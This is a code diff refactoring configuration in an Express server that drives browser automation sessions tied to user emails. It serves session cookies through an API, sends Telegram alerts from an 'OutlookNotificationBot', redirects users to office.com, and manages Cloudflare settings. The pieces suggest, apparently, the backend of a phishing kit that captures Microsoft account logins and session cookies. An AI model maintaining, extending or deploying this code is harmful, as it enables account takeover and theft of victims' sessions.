@@ -4,28 +4,13 @@ const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
 
-// Load environment variables from .env file
-if (fs.existsSync('.env')) {
-    const envFile = fs.readFileSync('.env', 'utf8');
-    envFile.split('\n').forEach(line => {
-        // Skip comments and empty lines
-        if (line.trim().startsWith('#') || !line.trim()) return;
-
-        const [key, ...valueParts] = line.split('=');
-        const value = valueParts.join('='); // Handle values with = in them
-
-        if (key && value && !process.env[key]) {
-            process.env[key] = value.trim();
-        }
-    });
-    console.log('✅ Environment variables loaded from .env file');
-}
+// Import centralized configuration
+const config = require('./src/config');
 
 const { ClosedBridgeAutomation } = require('./src/closedbridge-automation');
 const OutlookNotificationBot = require('./telegram-bot');
 
 const app = express();
-const PORT = 5000; // Fixed port for Replit environment
 
 // Import shared encryption utilities to eliminate code duplication
 const encryptionUtils = require('./src/encryption-utils');
@@ -39,30 +24,24 @@ function decryptData(encryptedText) {
     return encryptionUtils.decryptData(encryptedText);
 }
 
-// Security configuration - Always auto-generate
-const ADMIN_TOKEN = 'admin-' + Math.random().toString(36).substr(2, 24);
-
 // Make admin token available globally for Telegram bot
-global.adminToken = ADMIN_TOKEN;
+global.adminToken = config.security.adminToken;
 
 // Initialize Telegram Bot
 let telegramBot = null;
 try {
-    if (process.env.TELEGRAM_BOT_TOKEN) {
+    if (config.services.telegram.botToken) {
         telegramBot = new OutlookNotificationBot();
         console.log('🤖 Telegram Bot initialized successfully');
     } else {
-        console.log('⚠️ TELEGRAM_BOT_TOKEN not found - Telegram notifications disabled');
+        console.log('⚠️ Telegram bot token not configured - notifications disabled');
     }
 } catch (error) {
     console.error('❌ Failed to initialize Telegram Bot:', error.message);
 }
 
-// Middleware - Configure CORS for Replit environment
-app.use(cors({
-    origin: true, // Allow all origins for Replit proxy
-    credentials: true
-}));
+// Middleware - Configure CORS
+app.use(cors(config.server.cors));
 app.use(express.json());
 
 // Admin authentication middleware
@@ -71,7 +50,7 @@ function requireAdminAuth(req, res, next) {
                   (req.query && req.query.token) || 
                   (req.body && req.body.token);
 
-    if (!token || token !== ADMIN_TOKEN) {
+    if (!token || token !== config.security.adminToken) {
         return res.status(401).json({ 
             error: 'Unauthorized access to admin endpoint',
             message: 'Valid admin token required'
@@ -86,10 +65,11 @@ app.use(express.static('public'));
 // Store user sessions for browser automation only
 const userSessions = new Map(); // sessionId -> { sessionId, userEmail, createdAt, authenticated, verified }
 const automationSessions = new Map(); // sessionId -> { automation, status, email, startTime }
-const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
-const MAX_PRELOADS = 2; // Maximum number of concurrent preloaded browsers
-const MAX_WARM_BROWSERS = 0; // Disabled: Maximum number of pre-warmed browsers ready for immediate use
-const MIN_WARM_BROWSERS = 0; // Disabled: Minimum number of warm browsers to maintain
+// Use configuration constants
+const SESSION_TIMEOUT = config.security.sessionTimeout;
+const MAX_PRELOADS = config.automation.maxPreloads;
+const MAX_WARM_BROWSERS = config.automation.maxWarmBrowsers;
+const MIN_WARM_BROWSERS = config.automation.minWarmBrowsers;
 
 // Store for warm browsers that are pre-initialized and ready for immediate use
 const warmBrowserPool = new Map(); // warmId -> { automation, status, createdAt }
@@ -1950,7 +1930,7 @@ app.delete('/api/automation-cancel/:sessionId', async (req, res) => {
         const automationSession = automationSessions.get(sessionId);
 
         // Verify session ownership or admin access
-        const hasAdminAccess = req.headers['x-admin-token'] === ADMIN_TOKEN;
+        const hasAdminAccess = req.headers['x-admin-token'] === config.security.adminToken;
         const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId);
 
         if (!hasAdminAccess && !hasSessionAccess) {
@@ -2001,20 +1981,8 @@ app.delete('/api/automation-cancel/:sessionId', async (req, res) => {
 // Internal redirect URL endpoint (used by automation and admin panel)
 app.get('/api/internal/redirect-url', (req, res) => {
     try {
-        // Load redirect configuration
-        const redirectConfigPath = path.join(__dirname, 'redirect-config.json');
-        let redirectUrl = 'https://office.com'; // Default fallback
-
-        if (fs.existsSync(redirectConfigPath)) {
-            try {
-                const redirectConfig = JSON.parse(fs.readFileSync(redirectConfigPath, 'utf8'));
-                if (redirectConfig.redirectUrl) {
-                    redirectUrl = redirectConfig.redirectUrl;
-                }
-            } catch (configError) {
-                console.warn('Error reading redirect config:', configError.message);
-            }
-        }
+        // Use centralized redirect configuration
+        let redirectUrl = config.redirect.redirectUrl || 'https://office.com';
 
         res.json({
             success: true,
@@ -2121,7 +2089,7 @@ app.get('/api/cookies/:sessionId', (req, res) => {
         const clientSessionId = req.headers['x-session-id'];
         
         // Verify admin access or session ownership with proper authorization
-        const hasAdminAccess = req.headers['x-admin-token'] === ADMIN_TOKEN;
+        const hasAdminAccess = req.headers['x-admin-token'] === config.security.adminToken;
         const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId) && clientSessionId === sessionId;
         
         if (!hasAdminAccess && !hasSessionAccess) {
@@ -2162,7 +2130,7 @@ app.get('/api/session-data/:sessionId', (req, res) => {
         const clientSessionId = req.headers['x-session-id'];
         
         // Verify admin access or session ownership with proper authorization
-        const hasAdminAccess = req.headers['x-admin-token'] === ADMIN_TOKEN;
+        const hasAdminAccess = req.headers['x-admin-token'] === config.security.adminToken;
         const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId) && clientSessionId === sessionId;
         
         if (!hasAdminAccess && !hasSessionAccess) {
@@ -2234,14 +2202,8 @@ app.post('/api/admin/project-redirect', requireAdminAuth, (req, res) => {
             });
         }
 
-        // Update redirect-config.json
-        const redirectConfigPath = path.join(__dirname, 'redirect-config.json');
-        const redirectConfig = {
-            redirectUrl: redirectUrl,
-            lastUpdated: new Date().toISOString()
-        };
-
-        fs.writeFileSync(redirectConfigPath, JSON.stringify(redirectConfig, null, 2));
+        // Update redirect configuration using centralized config
+        config.saveRedirectConfig(redirectUrl);
         console.log(`📍 Project redirect updated to: ${redirectUrl}`);
 
         res.json({
@@ -2420,31 +2382,8 @@ app.delete('/api/admin/session/:sessionId', requireAdminAuth, (req, res) => {
     }
 });
 
-// Cloudflare configuration storage
-let cloudflareConfig = {
-    apiToken: null,    // For modern API tokens (Bearer)
-    apiKey: null,      // For legacy Global API Key
-    email: null,       // Required for Global API Key
-    zoneId: null,
-    configured: false
-};
-
-// Load Cloudflare config from file if exists
-const CLOUDFLARE_CONFIG_FILE = path.join(__dirname, 'cloudflare-config.json');
-if (fs.existsSync(CLOUDFLARE_CONFIG_FILE)) {
-    try {
-        const savedConfig = JSON.parse(fs.readFileSync(CLOUDFLARE_CONFIG_FILE, 'utf8'));
-        cloudflareConfig = { ...cloudflareConfig, ...savedConfig };
-
-        console.log('🌤️ Cloudflare configuration loaded from file');
-        if (cloudflareConfig.email && cloudflareConfig.apiKey && cloudflareConfig.zoneId) {
-            console.log('✅ Global API Key authentication configured');
-            cloudflareConfig.configured = true;
-        }
-    } catch (error) {
-        console.warn('Error loading Cloudflare config:', error.message);
-    }
-}
+// Use centralized Cloudflare configuration
+let cloudflareConfig = config.cloudflare;
 
 // Helper function to make Cloudflare API calls
 async function callCloudflareAPI(endpoint, method = 'GET', data = null) {
@@ -2559,9 +2498,8 @@ app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) =
         try {
             await callCloudflareAPI('');
 
-            // Save configuration to file
-            fs.writeFileSync(CLOUDFLARE_CONFIG_FILE, JSON.stringify(testConfig, null, 2));
-            console.log('🌤️ Cloudflare configuration saved successfully');
+            // Save configuration using centralized config
+            config.saveCloudflareConfig(testConfig);
 
             res.json({
                 success: true,
@@ -2999,11 +2937,11 @@ app.get('/api/browser-pool-status', (req, res) => {
 });
 
 // Start server
-app.listen(PORT, '0.0.0.0', () => {
-    console.log('🚀 Browser Automation Backend running on port', PORT);
-    console.log('🤖 Browser automation endpoints available at http://localhost:' + PORT + '/api/');
-    console.log('🌐 Frontend available at http://localhost:' + PORT + '/');
-    console.log('🔧 Admin panel available at http://localhost:' + PORT + '/ad.html');
+app.listen(config.server.port, '0.0.0.0', () => {
+    console.log('🚀 Browser Automation Backend running on port', config.server.port);
+    console.log('🤖 Browser automation endpoints available at http://localhost:' + config.server.port + '/api/');
+    console.log('🌐 Frontend available at http://localhost:' + config.server.port + '/');
+    console.log('🔧 Admin panel available at http://localhost:' + config.server.port + '/ad.html');
 
     if (!telegramBot) {
         console.log('❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications');
